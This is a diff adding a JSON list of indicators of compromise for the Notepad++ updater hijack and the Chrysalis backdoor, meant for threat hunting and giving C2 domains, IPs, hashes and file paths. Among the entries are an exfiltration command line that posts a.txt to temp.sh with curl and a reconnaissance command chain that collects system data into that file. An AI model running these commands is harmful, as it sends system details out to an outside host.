@@ -1,0 +1,689 @@
+[
+  {
+    "indicator": "IOC_CAUTIONS",
+    "type": "meta",
+    "attributed_to": "Hunt guidance",
+    "source_urls": [
+      "https://notepad-plus-plus.org/news/v889-released/",
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/",
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://notepad-plus-plus.org/news/hijacked-incident-info-update/",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "analysis caveat",
+    "notes": "Indicators include a mix of confirmed hashes (Rapid7) and incident-reported behaviors. Validate with process lineage, signer metadata, and time alignment before action. Domain/IP ownership can change and should be revalidated at time of use. Notepad++ did not publish malicious hashes."
+  },
+  {
+    "indicator": "api.skycloudcenter.com",
+    "type": "domain",
+    "attributed_to": "Rapid7 (Chrysalis C2)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "command and control",
+    "notes": "Observed Chrysalis C2 domain; confirm with network telemetry and process context."
+  },
+  {
+    "indicator": "api.wiresguard.com",
+    "type": "domain",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "command and control",
+    "notes": "Reported C2 domain for associated loader; validate ownership and activity before action."
+  },
+  {
+    "indicator": "61.4.102.97",
+    "type": "ip",
+    "attributed_to": "Rapid7 (DNS resolution for api.skycloudcenter.com)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "command and control",
+    "notes": "IP observed resolving the C2 domain during analysis; verify current ownership before action."
+  },
+  {
+    "indicator": "59.110.7.32",
+    "type": "ip",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "command and control",
+    "notes": "Reported C2 IP associated with loader variants; verify current ownership before action."
+  },
+  {
+    "indicator": "124.222.137.114",
+    "type": "ip",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "command and control",
+    "notes": "Reported C2 IP associated with loader variants; verify current ownership before action."
+  },
+  {
+    "indicator": "95.179.213.0",
+    "type": "ip",
+    "attributed_to": "Rapid7 (update.exe download host)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "payload delivery",
+    "notes": "Observed hosting for malicious update.exe during Rapid7 analysis; verify current ownership before action."
+  },
+  {
+    "indicator": "a511be5164dc1122fb5a7daa3eef9467e43d8458425b15a640235796006590c9",
+    "type": "sha256",
+    "attributed_to": "Rapid7 (update.exe)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "payload delivery",
+    "notes": "Malicious update.exe hash from Rapid7 analysis."
+  },
+  {
+    "indicator": "8ea8b83645fba6e23d48075a0d3fc73ad2ba515b4536710cda4f1f232718f53e",
+    "type": "sha256",
+    "attributed_to": "Rapid7 ([NSIS].nsi)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "payload staging",
+    "notes": "NSIS script hash from Rapid7 analysis."
+  },
+  {
+    "indicator": "2da00de67720f5f13b17e9d985fe70f10f153da60c9ab1086fe58f069a156924",
+    "type": "sha256",
+    "attributed_to": "Rapid7 (BluetoothService.exe)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "payload execution",
+    "notes": "BluetoothService.exe loader used for DLL sideloading."
+  },
+  {
+    "indicator": "77bfea78def679aa1117f569a35e8fd1542df21f7e00e27f192c907e61d63a2e",
+    "type": "sha256",
+    "attributed_to": "Rapid7 (BluetoothService shellcode)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "payload execution",
+    "notes": "Shellcode embedded within BluetoothService file."
+  },
+  {
+    "indicator": "3bdc4c0637591533f1d4198a72a33426c01f69bd2e15ceee547866f65e26b7ad",
+    "type": "sha256",
+    "attributed_to": "Rapid7 (log.dll)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "payload execution",
+    "notes": "Malicious DLL sideloaded by BluetoothService.exe."
+  },
+  {
+    "indicator": "9276594e73cda1c69b7d265b3f08dc8fa84bf2d6599086b9acc0bb3745146600",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload staging",
+    "notes": "u.bat hash reported as cleanup batch file."
+  },
+  {
+    "indicator": "f4d829739f2d6ba7e3ede83dad428a0ced1a703ec582fc73a4eee3df3704629a",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload staging",
+    "notes": "conf.c hash reported as shellcode source file."
+  },
+  {
+    "indicator": "4a52570eeaf9d27722377865df312e295a7a23c3b6eb991944c2ecd707cc9906",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload staging",
+    "notes": "libtcc.dll hash reported as Tiny C Compiler library used to compile/run conf.c."
+  },
+  {
+    "indicator": "831e1ea13a1bd405f5bda2b9d8f2265f7b1db6c668dd2165ccc8a9c4c15ea7dd",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload staging",
+    "notes": "admin file hash reported as retrieved from api.wiresguard.com."
+  },
+  {
+    "indicator": "0a9b8df968df41920b6ff07785cbfebe8bda29e6b512c94a3b2a83d10014d2fd",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "loader1 sample hash."
+  },
+  {
+    "indicator": "4c2ea8193f4a5db63b897a2d3ce127cc5d89687f380b97a1d91e0c8db542e4f8",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "uffhxpSy shellcode associated with loader1."
+  },
+  {
+    "indicator": "e7cd605568c38bd6e0aba31045e1633205d0598c607a855e2e1bca4cca1c6eda",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "loader2 sample hash."
+  },
+  {
+    "indicator": "078a9e5c6c787e5532a7e728720cbafee9021bfec4a30e3c2be110748d7c43c5",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "3yzr31vk shellcode associated with loader2."
+  },
+  {
+    "indicator": "b4169a831292e245ebdffedd5820584d73b129411546e7d3eccf4663d5fc5be3",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "ConsoleApplication2.exe loader hash."
+  },
+  {
+    "indicator": "7add554a98d3a99b319f2127688356c1283ed073a084805f14e33b4f6a6126fd",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "system shellcode associated with ConsoleApplication2.exe."
+  },
+  {
+    "indicator": "fcc2765305bcd213b7558025b2039df2265c3e0b6401e4833123c461df2de51a",
+    "type": "sha256",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "s047t5g.exe loader hash."
+  },
+  {
+    "indicator": "u.bat",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload staging",
+    "notes": "Temporary batch file used for cleanup."
+  },
+  {
+    "indicator": "conf.c",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload staging",
+    "notes": "C source file containing shellcode bytes."
+  },
+  {
+    "indicator": "libtcc.dll",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload staging",
+    "notes": "Tiny C Compiler library used to compile/run conf.c."
+  },
+  {
+    "indicator": "admin",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload staging",
+    "notes": "File retrieved from api.wiresguard.com."
+  },
+  {
+    "indicator": "loader1",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "Loader variant name."
+  },
+  {
+    "indicator": "uffhxpSy",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "Shellcode file associated with loader1."
+  },
+  {
+    "indicator": "loader2",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "Loader variant name."
+  },
+  {
+    "indicator": "3yzr31vk",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "Shellcode file associated with loader2."
+  },
+  {
+    "indicator": "ConsoleApplication2.exe",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "Loader variant using Microsoft Warbird."
+  },
+  {
+    "indicator": "system",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "Shellcode file associated with ConsoleApplication2.exe."
+  },
+  {
+    "indicator": "s047t5g.exe",
+    "type": "filename",
+    "attributed_to": "Cybersecurity News (secondary reporting)",
+    "source_urls": [
+      "https://cybersecuritynews.com/notepad-hack/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution",
+    "notes": "Loader variant name."
+  },
+  {
+    "indicator": "%AppData%\\Bluetooth\\BluetoothService.exe",
+    "type": "filepath",
+    "attributed_to": "Rapid7 (Chrysalis loader path)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "payload execution",
+    "notes": "Hidden directory creation under AppData; validate with process context."
+  },
+  {
+    "indicator": "%AppData%\\Bluetooth\\log.dll",
+    "type": "filepath",
+    "attributed_to": "Rapid7 (Chrysalis loader path)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "payload execution",
+    "notes": "Sideloaded DLL used by BluetoothService.exe."
+  },
+  {
+    "indicator": "BluetoothService.exe",
+    "type": "filename",
+    "attributed_to": "Rapid7 (Chrysalis loader name)",
+    "source_urls": [
+      "https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "payload execution",
+    "notes": "Used as a loader name; validate with file path and signer metadata to avoid Bitdefender false positives."
+  },
+  {
+    "indicator": "AutoUpdater.exe",
+    "type": "filename",
+    "attributed_to": "Reported malicious updater dropped via hijacked WinGUp update chain",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.heise.de/en/news/Notepad-updater-installed-malware-11109726.html",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html",
+      "https://cyber.gov.rw/updates/article/security-alert-notepad-update-vulnerability-enables-malware-installation/",
+      "https://notepad-plus-plus.org/news/hijacked-incident-info-update/",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "payload execution / post-update activity",
+    "notes": "Observed in user TEMP and associated with reported malicious update behavior; forum report notes the AutoUpdater.exe hash was unknown. Treat as supporting signal pending validation."
+  },
+  {
+    "indicator": "update.exe",
+    "type": "filename",
+    "attributed_to": "Reported suspicious updater binary in TEMP tied to WinGUp hijack reports",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://doublepulsar.com/small-numbers-of-notepad-users-reporting-security-woes-371d7a3fd2d9",
+      "https://cyber.gov.rw/updates/article/security-alert-notepad-update-vulnerability-enables-malware-installation/",
+      "https://www.heise.de/en/news/Notepad-updater-installed-malware-11109726.html",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html",
+      "https://notepad-plus-plus.org/news/hijacked-incident-info-update/",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution / staging",
+    "notes": "Secondary reporting only; use as supporting signal and validate with process chain and signer metadata."
+  },
+  {
+    "indicator": "temp.sh",
+    "type": "domain",
+    "attributed_to": "Reported exfil destination in user reports and secondary writeups",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://hackmag.com/news/notepad-bug",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html",
+      "https://notepad-plus-plus.org/news/hijacked-incident-info-update/",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "exfiltration destination",
+    "notes": "Reported in forum-referenced incidents; treat as incident-specific until corroborated."
+  },
+  {
+    "indicator": "https://temp.sh/upload",
+    "type": "url",
+    "attributed_to": "Reported exfil upload URL used by AutoUpdater.exe via curl.exe",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "exfiltration endpoint",
+    "notes": "Forum report shows curl.exe posting a.txt to this endpoint; validate via correlated process and network telemetry."
+  },
+  {
+    "indicator": "51.91.79.17",
+    "type": "ip",
+    "attributed_to": "Reported blocklisted IP associated with temp.sh in forum report",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "exfiltration infrastructure (reported)",
+    "notes": "Forum post references temp.sh likely corresponding to this IP; treat as incidental and verify current ownership before action."
+  },
+  {
+    "indicator": "curl.exe -F \"file=@a.txt\" -s https://temp.sh/upload",
+    "type": "command_line",
+    "attributed_to": "Reported exfil command from forum incident",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "medium",
+    "tactic_or_use": "exfiltration",
+    "notes": "Use as a high-fidelity correlation with AutoUpdater.exe and GUP.exe lineage; confirm user context."
+  },
+  {
+    "indicator": "\"C:\\\\Program Files\\\\Notepad++\\\\updater\\\\gup.exe\" -v8.84 -px64",
+    "type": "command_line",
+    "attributed_to": "Reported GUP.exe invocation preceding AutoUpdater.exe",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "update chain context",
+    "notes": "Illustrative example from a single report; treat as context rather than a strict IOC."
+  },
+  {
+    "indicator": "\"C:\\\\Users\\\\[user]\\\\AppData\\\\Local\\\\Temp\\\\AutoUpdater.exe\" /closeRunningNpp /S /runNppAfterSilentInstall",
+    "type": "command_line",
+    "attributed_to": "Reported AutoUpdater.exe execution arguments",
+    "source_urls": [
+      "https://community.notepad-plus-plus.org/topic/27212/autoupdater-and-connection-temp-sh",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution context",
+    "notes": "Specific to forum report; match loosely with Temp path patterns and parent/child lineage."
+  },
+  {
+    "indicator": "a.txt",
+    "type": "filename",
+    "attributed_to": "Reported exfil staging file during malicious update activity",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://hackmag.com/news/notepad-bug",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "exfil staging",
+    "notes": "Observed in reports of compromised updater behavior; validate with correlated process and network activity."
+  },
+  {
+    "indicator": "cmd /c (netstat -ano|systeminfo|tasklist|whoami) >> a.txt",
+    "type": "command_line",
+    "attributed_to": "Reported reconnaissance commands executed by AutoUpdater.exe",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://hackmag.com/news/notepad-bug",
+      "https://t.me/ThreatHuntingFather/1130"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Reported in incident recaps; use as supporting signal and correlate with updater lineage."
+  },
+  {
+    "indicator": "netstat.exe",
+    "type": "process",
+    "attributed_to": "Reported recon commands executed by malicious updater",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Use as supporting signal only; common administrative command. Correlate with updater process ancestry."
+  },
+  {
+    "indicator": "systeminfo.exe",
+    "type": "process",
+    "attributed_to": "Reported recon commands executed by malicious updater",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Use as supporting signal only; common administrative command. Correlate with updater process ancestry."
+  },
+  {
+    "indicator": "tasklist.exe",
+    "type": "process",
+    "attributed_to": "Reported recon commands executed by malicious updater",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Use as supporting signal only; common administrative command. Correlate with updater process ancestry."
+  },
+  {
+    "indicator": "whoami.exe",
+    "type": "process",
+    "attributed_to": "Reported recon commands executed by malicious updater",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "discovery",
+    "notes": "Use as supporting signal only; common administrative command. Correlate with updater process ancestry."
+  },
+  {
+    "indicator": "GUP.exe network to non-Notepad++/GitHub domains",
+    "type": "behavior",
+    "attributed_to": "Guidance to flag unexpected updater network destinations",
+    "source_urls": [
+      "https://doublepulsar.com/small-numbers-of-notepad-users-reporting-security-woes-371d7a3fd2d9",
+      "https://www.heise.de/en/news/Notepad-updater-installed-malware-11109726.html",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "exfiltration / C2 candidate",
+    "notes": "Heuristic: update traffic should normally hit notepad-plus-plus.org or GitHub release domains; investigate deviations."
+  },
+  {
+    "indicator": "GUP.exe spawning non-Notepad++ executables",
+    "type": "behavior",
+    "attributed_to": "Guidance to flag unusual child processes launched by GUP.exe",
+    "source_urls": [
+      "https://www.heise.de/en/news/Notepad-updater-installed-malware-11109726.html",
+      "https://securityaffairs.com/185622/hacking/notepad-fixed-updater-bugs-that-allowed-malicious-update-hijacking.html"
+    ],
+    "confidence": "low",
+    "tactic_or_use": "payload execution / defense evasion",
+    "notes": "Heuristic: GUP.exe should typically launch only explorer.exe and Notepad++ installers; investigate other child processes."
+  },
+  {
+    "indicator": "https://notepad-plus-plus.org/update/getDownloadUrl.php",
+    "type": "url",
+    "attributed_to": "Official WinGUp update URL referenced in reporting of hijacked update traffic",
+    "source_urls": [
+      "https://www.f5.com/labs/articles/threat-intelligence/notepadplusplus-updater-hijack",
+      "https://notepad-plus-plus.org/news/v889-released/",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://notepad-plus-plus.org/news/hijacked-incident-info-update/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update manifest retrieval (baseline reference)",
+    "notes": "Baseline updater endpoint; deviations or redirections from this path are the suspicious condition."
+  },
+  {
+    "indicator": "https://notepad-plus-plus.org/update/getDownloadUrl.php?version=<versionnumber>",
+    "type": "url",
+    "attributed_to": "Reported WinGUp update URL format used to retrieve XML with download location",
+    "source_urls": [
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/",
+      "https://notepad-plus-plus.org/news/hijacked-incident-info-update/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update manifest retrieval (baseline reference)",
+    "notes": "Used by WinGUp to request update metadata; intercepting or modifying the response is the suspected hijack path."
+  },
+  {
+    "indicator": "notepad-plus-plus.org",
+    "type": "domain",
+    "attributed_to": "Official update domain referenced in Notepad++ release notes",
+    "source_urls": [
+      "https://notepad-plus-plus.org/news/v889-released/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update infrastructure (baseline reference)",
+    "notes": "Expected update domain for WinGUp. Use as a baseline for comparison rather than a malicious IOC."
+  },
+  {
+    "indicator": "github.com",
+    "type": "domain",
+    "attributed_to": "Official Notepad++ release hosting (baseline)",
+    "source_urls": [
+      "https://notepad-plus-plus.org/news/v889-released/",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update infrastructure (baseline reference)",
+    "notes": "Official release hosting and assets; use as a baseline for normal updater traffic."
+  },
+  {
+    "indicator": "release-assets.githubusercontent.com",
+    "type": "domain",
+    "attributed_to": "GitHub release asset hosting (baseline)",
+    "source_urls": [
+      "https://notepad-plus-plus.org/news/v889-released/",
+      "https://www.bleepingcomputer.com/news/security/notepad-plus-plus-fixes-flaw-that-let-attackers-push-malicious-update-files/"
+    ],
+    "confidence": "high",
+    "tactic_or_use": "update infrastructure (baseline reference)",
+    "notes": "Expected CDN domain for GitHub release assets; deviations should be investigated."
+  }
+]
